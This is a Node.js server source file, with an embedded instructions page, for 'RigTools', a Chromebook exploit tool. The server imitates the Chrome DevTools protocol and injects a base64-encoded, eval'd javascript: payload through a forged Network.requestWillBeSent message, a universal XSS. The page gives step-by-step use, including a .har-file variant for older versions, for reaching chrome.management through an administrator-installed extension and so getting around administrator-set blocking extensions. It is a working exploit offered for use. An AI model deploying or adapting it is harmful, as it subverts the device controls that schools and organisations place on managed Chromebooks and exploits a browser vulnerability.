import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";
import * as readline from "readline-sync";
import * as fs from "fs";
import path from "path";

const WebSocket_port = 8080;
const HTTP_port = 9123;

// serve static files
const serve = serveStatic("./");

const WhalePage = `
<head>
<style>
/* Import Inter font */
/* More info at https://github.com/xz/fonts */
@import url('https://fonts.xz.style/serve/inter.css');

:root {
  --lavender: 62.56% 0.236 299.56;
	--nc-font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
	--nc-font-mono: Consolas, monaco, 'Ubuntu Mono', 'Liberation Mono', 'Courier New', Courier, monospace;
	--nc-tx-1: #ffffff;
	--nc-tx-2: #eeeeee;
	--nc-bg-1: #000000;
	--nc-bg-2: #111111;
	--nc-bg-3: #222222;
	--nc-lk-1: #3291FF;
	--nc-lk-2: #0070F3;
	--nc-lk-tx: #FFFFFF;
	--nc-ac-1: #7928CA;
	--nc-ac-tx: #FFFFFF;
}

* {
	/* Reset margins and padding */
	margin: 0;
	padding: 0;
}

address,
area,
article,
aside,
audio,
blockquote,
datalist,
details,
dl,
fieldset,
figure,
form,
input,
iframe,
img,
meter,
nav,
ol,
optgroup,
option,
output,
p,
pre,
progress,
ruby,
section,
table,
textarea,
ul,
video {
	/* Margins for most elements */
	margin-bottom: 1rem;
}

html,input,select,button {
	/* Set body font family and some finicky elements */
	font-family: var(--nc-font-sans);
}

body {
	/* Center body in page */
	margin: 0 auto;
	max-width: 750px;
	padding: 2rem;
	border-radius: 6px;
	overflow-x: hidden;
	word-break: break-word;
	overflow-wrap: break-word;
	background: var(--nc-bg-1);

	/* Main body text */
	color: var(--nc-tx-2);
	font-size: 1.03rem;
	line-height: 1.5;
}

::selection {
	/* Set background color for selected text */
	background: var(--nc-ac-1);
	color: var(--nc-ac-tx);
}

h1,h2,h3,h4,h5,h6 {
	line-height: 1;
	color: var(--nc-tx-1);
	padding-top: .875rem;
}

h1,
h2,
h3 {
	color: var(--nc-tx-1);
	padding-bottom: 2px;
	margin-bottom: 8px;
	border-bottom: 1px solid var(--nc-bg-2);
}

h4,
h5,
h6 {
	margin-bottom: .3rem;
}

h1 {
	font-size: 2.25rem;
}

h2 {
	font-size: 1.85rem;
}

h3 {
	font-size: 1.55rem;
}

h4 {
	font-size: 1.25rem;
}

h5 {
	font-size: 1rem;
}

h6 {
	font-size: .875rem;
}


abbr:hover {
	/* Set the '?' cursor while hovering an abbreviation */
	cursor: help;
}

blockquote {
	padding: 1.5rem;
	background: var(--nc-bg-2);
	border-left: 5px solid var(--nc-bg-3);
	border-radius: 10px;
}

abbr {
	cursor: help;
}

blockquote *:last-child {
	padding-bottom: 0;
	margin-bottom: 0;
}

header {
	background: var(--nc-bg-2);
	border-bottom: 1px solid var(--nc-bg-3);
	padding: 2rem 1.5rem;
	
	/* This sets the right and left margins to cancel out the body's margins. It's width is still the same, but the background stretches across the page's width. */

	margin: -2rem calc(0px - (50vw - 50%)) 2rem;

	/* Shorthand for:

	margin-top: -2rem;
	margin-bottom: 2rem;

	margin-left: calc(0px - (50vw - 50%));
	margin-right: calc(0px - (50vw - 50%)); */
	
	padding-left: calc(50vw - 50%);
	padding-right: calc(50vw - 50%);
}

header h1,
header h2,
header h3 {
	padding-bottom: 0;
	border-bottom: 0;
}

header > *:first-child {
	margin-top: 0;
	padding-top: 0;
}

header > *:last-child {
	margin-bottom: 0;
}

a button,
button,
input[type="submit"],
input[type="reset"],
input[type="button"] {
	font-size: 1rem;
	display: inline-block;
	padding: 6px 12px;
	text-align: center;
	text-decoration: none;
	white-space: nowrap;
	background: var(--nc-lk-1);
	color: var(--nc-lk-tx);
	border: 0;
	border-radius: 4px;
	box-sizing: border-box;
	cursor: pointer;
	color: var(--nc-lk-tx);
}

a button[disabled],
button[disabled],
input[type="submit"][disabled],
input[type="reset"][disabled],
input[type="button"][disabled] {
	cursor: default;
	opacity: .5;

	/* Set the [X] cursor while hovering a disabled link */
	cursor: not-allowed;
}

.button:focus,
.button:hover,
button:focus,
button:hover,
input[type="submit"]:focus,
input[type="submit"]:hover,
input[type="reset"]:focus,
input[type="reset"]:hover,
input[type="button"]:focus,
input[type="button"]:hover {
	background: var(--nc-lk-2);
}

code,
pre,
kbd,
samp {
	/* Set the font family for monospaced elements */
	font-family: var(--nc-font-mono);
}

code,
samp,
kbd,
pre {
	/* The main preformatted style. This is changed slightly across different cases. */
	background: var(--nc-bg-2);
	border: 1px solid var(--nc-bg-3);
	border-radius: 4px;
	padding: 3px 6px;
	font-size: 0.9rem;
}

kbd {
	/* Makes the kbd element look like a keyboard key */
	border-bottom: 3px solid var(--nc-bg-3);
}

pre {
	padding: 1rem 1.4rem;
	max-width: 100%;
	overflow: auto;
}

pre code {
	/* When <code> is in a <pre>, reset it's formatting to blend in */
	background: inherit;
	font-size: inherit;
	color: inherit;
	border: 0;
	padding: 0;
	margin: 0;
}

code pre {
	/* When <pre> is in a <code>, reset it's formatting to blend in */
	display: inline;
	background: inherit;
	font-size: inherit;
	color: inherit;
	border: 0;
	padding: 0;
	margin: 0;
}

details {
	/* Make the <details> look more "clickable" */
	padding: .6rem 1rem;
	background: var(--nc-bg-2);
	border: 1px solid var(--nc-bg-3);
	border-radius: 4px;
}

summary {
	/* Makes the <summary> look more like a "clickable" link with the pointer cursor */
	cursor: pointer;
	font-weight: bold;
}

details[open] {
	/* Adjust the <details> padding while open */
	padding-bottom: .75rem;
}

details[open] summary {
	/* Adjust the <details> padding while open */
	margin-bottom: 6px;
}

details[open]>*:last-child {
	/* Resets the bottom margin of the last element in the <details> while <details> is opened. This prevents double margins/paddings. */
	margin-bottom: 0;
}

dt {
	font-weight: bold;
}

dd::before {
	/* Add an arrow to data table definitions */
	content: '→ ';
}

hr {
	/* Reset the border of the <hr> separator, then set a better line */
	border: 0;
	border-bottom: 1px solid var(--nc-bg-3);
	margin: 1rem auto;
}

fieldset {
	margin-top: 1rem;
	padding: 2rem;
	border: 1px solid var(--nc-bg-3);
	border-radius: 4px;
}

legend {
	padding: auto .5rem;
}

table {
	/* border-collapse sets the table's elements to share borders, rather than floating as separate "boxes". */
	border-collapse: collapse;
	width: 100%
}

td,
th {
	border: 1px solid var(--nc-bg-3);
	text-align: left;
	padding: .5rem;
}

th {
	background: var(--nc-bg-2);
}

tr:nth-child(even) {
	/* Set every other cell slightly darker. Improves readability. */
	background: var(--nc-bg-2);
}

table caption {
	font-weight: bold;
	margin-bottom: .5rem;
}

textarea {
	/* Don't let the <textarea> extend off the screen naturally or when dragged by the user */
	max-width: 100%;
}

ol,
ul {
	/* Replace the browser default padding */
	padding-left: 2rem;
}

li {
	margin-top: .4rem;
}

ul ul,
ol ul,
ul ol,
ol ol {
	margin-bottom: 0;
}

mark {
	padding: 3px 6px;
	background: var(--nc-ac-1);
	color: var(--nc-ac-tx);
}

textarea,
select,
input {
	padding: 6px 12px;
	margin-bottom: .5rem;
	background: var(--nc-bg-2);
	color: var(--nc-tx-2);

	/* Set a transparent border. It isn't visible on idle, but prevents the cell from growing in size when a darker border is set on focus. */
	border: 1px solid transparent;
	border-radius: 4px;
	box-shadow: none;
	box-sizing: border-box;
}

textarea:focus,
select:focus,
input[type]:focus {
	border-color: var(--nc-bg-3);

	/* Reset any browser default outlines */
	outline: 0;
}

img {
	max-width: 100%;
}
.custom-notification {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%) scale(0.95);
  max-width: 90%;
  background-color: #000;
  color: white;
  padding: 20px;
  border: 2px dashed rgb(255, 83, 83);
  border-radius: 10px;
  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
  opacity: 0;
  transition: opacity 0.5s ease, transform 0.5s ease;
  z-index: 10000;
  font-family: sans-serif;
  font-size: 14px;
}

.custom-notification.show {
  opacity: 1;
  transform: translate(-50%, -50%) scale(1);
}

a {
  color: oklch(var(--lavender));
  display: inline-block;
  text-decoration: wavy underline;
  transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.9);
}
a:hover {
  transform: scale(1.05) skew(-5deg);
}
</style>
<script>
  window.addEventListener("DOMContentLoaded", () => {
    setTimeout(() => {
      const notification = document.getElementById("tiktok-notification");
      if (notification) {
        notification.classList.add("show");

        setTimeout(() => {
          notification.classList.remove("show");
        }, 8000);
      }
    }, 500);
  });
</script>

</head>

<body>
<div id="tiktok-notification" class="custom-notification">
  <h1>If you're coming from TikTok / ext-remover:</h1>
  <p>The only person who truly made this isn't on TikTok. Their username is <a href="https://github.com/FWSmasher">FWSmasher</a> on GitHub or @unretained on Discord.</p>
  <p>The current one you're using is <a href="https://github.com/t3m1n4l/rigtools-updated-ui">a custom UI fork</a>, with multiple contributors.</p>
  <p>AKA: if someone tells you that they made this, they're lying and you should laugh at them.</p>
</div>

<div style="text-align: center;">
    <div style="display: flex; justify-content: center; align-items: flex-start;">
    <img src="https://raw.githubusercontent.com/T3M1N4L/rigtools-updated-ui/refs/heads/main/rigtools-bounce.gif" height="170vh" style="margin-right: 10px;" />
    <img alt="rigtools" src="https://github.com/user-attachments/assets/f491a85e-9fd7-4fe4-979f-1fa70a1b630e" height="170vh" />
	</div>
</div>

<h1 id="how-to-use-rigtools-updated">How to use RigTools</h1>
<hr>
<h3 id="requirements">Requirements:</h3>
<ul>
    <li>A brain</li>
    <li>A Chromebook on 128 or below (check via chrome://version), if you have any version less than 133 scroll down till you see hartools</li>
    <li>An internet connection</li>
    <li>A blocking extension</li>
</ul>
<hr>
<h3 id="links">Link:</h3>
<ul>
    <li>
        <code id="generated-link"></code>
    </li>
</ul>
<hr>
<h3 id="instructions">Instructions:</h3>
<ol>
    <li>Open <code>devtools://devtools/bundled/devtools_app.html</code></li>
    <li>Open up the link above</li>
    <li>Double click the gray box</li>
    <li>If you have specific extension buttons, click your extension button. Otherwise, click the extension id button and paste in your blocking extension's id (it has to be installed by administrator and it has to have the ability to manage other extensions)</li>
</ol>
<blockquote>
<p><strong>Note</strong>: After using rigtools, the chrome.management page will always be located at <code>filesystem:chrome-extension://ext-id/temporary/index.html</code>. It is recommended to bookmark this page as it persists after shutdown and is only overwritten by using rigtools again.</p>
</blockquote>
<blockquote>
<p>After using the update button on rigtools, the newly updated file will always be located at <code>filesystem:chrome-extension://ext-id/persistent/rigtools.html</code>. Bookmark this page instead if you want to constantly get the latest updates and bug-fixes.</p>
</blockquote>

<hr>
<h3 id="hartools">Rigtools on <133</h3>
<p>
<ol>
<li>Download the latest <code>.har</code> file from the <a href="https://github.com/t3m1n4l/rigtools-updated-ui/releases/latest/">releases page</a></li>
<li>Get the <code>.har</code> file onto the device you want to run the devtools XSS on</li>
<li>On the device you want to run the devtools XSS on go to devtools://devtools/bundled/inspector.html</li>
<blockquote>
If <code>devtools://devtools/bundled/inspector.html</code> is blocked use the one of the follwoing links</p>
<ul>
<li><code>devtools://devtools/bundled/js_app.html</code></li>
<li><code>devtools://devtools/bundled/devtools_app.html</code></li>
<li><code>devtools://devtools/bundled/worker_app.html</code></li>
</ul>
</blockquote>
</li>
<li>Once it FULLY loads, add <code>?experiments=true</code> to the end of the URL and click enter. (ex. <code>devtools://devtools/bundled/inspector.html?expirements=true</code>)</li>
<li>Go to the <code>Network</code> tab. If you can&#39;t find it there should be a button on the topbar that looks like this <code>&gt;&gt;</code> and a dropdown should open in which you can select <code>Network</code><blockquote>
<p>^^^ if you are already on the network page you can skip this ^^^</p>
</blockquote>
</li>
<li>Click the little upload button and upload the downloaded <code>.har</code> file<blockquote>
<p>^^^ you may need to expand the sidebar to see it ^^^</p>
</blockquote>
</li>
<li>Double click on the text that appears in the box [DOUBLE CLICK]</li>
</ol>
</p>
<hr>
<h3 id="repo">Repo:</h3>
<p><a href="https://github.com/T3M1N4L/rigtools-updated-ui">https://github.com/T3M1N4L/rigtools-updated-ui</a> Based off of <a href="https://github.com/Miner49ur/rigtools">Miner49ur's fork of Rigtools</a>, Hartools by <a href="https://crossjbly.pages.dev/">crossjbly</a></p>

<script>
let currentUrl = window.location.hostname + window.location.pathname;

if (currentUrl.charAt(currentUrl.length - 1) === '/') {
    currentUrl = currentUrl.slice(0, -1);
}

// Check if the port exists and format the link accordingly
const port = window.location.port ? ':' + window.location.port : '';
document.getElementById('generated-link').textContent = 'devtools://devtools/bundled/devtools_app.html?experiments=true&ws=' + currentUrl + port;
</script>
</body>
`;

let globalUID = 0;
let sessionId = "89AC63D12B18F3EE9808C13899C9B695";

// Reading the server configuration
let serverConfig = '{"updater_url": "rigtools.asyncsmasher.com"}';
try {
  serverConfig = fs.readFileSync("server_config.json");
} catch (e) {
  console.log(
    `Using default update url ${
      JSON.parse(serverConfig).updater_url
    } because it failed to read the file: \n${e}`
  );
}

const server = createServer((req, res) => {
  if (
    req.headers.upgrade &&
    req.headers.upgrade.toLowerCase() === "websocket"
  ) {
    return;
  }

  // Serve the custom HTML page for normal HTTP requests
  res.setHeader("Content-Type", "text/html");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.writeHead(200);
  res.end(WhalePage);
});

// WebSocket server
const wss = new WebSocketServer({ server });

wss.on("connection", function connection(wss_con) {
  wss_con.on("message", async (msg) => {
    const result = {
      payload1: eval(fs.readFileSync("payload.mjs")),
    };
    let htmlFile = fs
      .readFileSync(new URL("./payloads/index.html", import.meta.url))
      .toString();
    htmlFile.replace("`", "&#96;");
    let jsFile = fs
      .readFileSync(new URL("./payloads/index.js", import.meta.url))
      .toString();
    let json_msg = JSON.parse(msg.toString());
    let { id, method, params } = json_msg;
    console.log(id + "> ", method, params);
    const entry = fs.readFileSync("./entry/entry.html");

    if (method === "Target.setDiscoverTargets") {
      wss_con.send(
        JSON.stringify({
          method: "Network.requestWillBeSent",
          params: {
            request: {
              url: `javascript: (function () {eval(atob("${btoa(
                `(${result.payload1
                  .toString()
                  .replace("%%EXTJS%%", btoa(jsFile))
                  .replace("%%EXTHTML%%", btoa(htmlFile))
                  .replace(
                    /%%updaterurl%%/g,
                    JSON.parse(serverConfig).updater_url
                  )
                  .replace("%%HTMLENTRY%%", btoa(entry.toString()))})()`
              )}"))})() /********************************************Built-in payload for uxss*/ `,
            },
          },
        })
      );
    }

    wss_con.send(
      JSON.stringify({
        id: id,
        error: null,
        sessionId: sessionId,
        result: {},
      })
    );
  });
});

server.listen(WebSocket_port, () => {
  console.log(
    `Server running and WebSocket accessible at ws://localhost:${WebSocket_port}`
  );
});

createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  serve(req, res, finalhandler(req, res));
}).listen(HTTP_port);

console.log(
  `The HTTP server is accessible at http://localhost:${HTTP_port}\n--------`
);
console.log(
  `The WebSocket is accessible at ws://localhost:${WebSocket_port}\n--------`
);
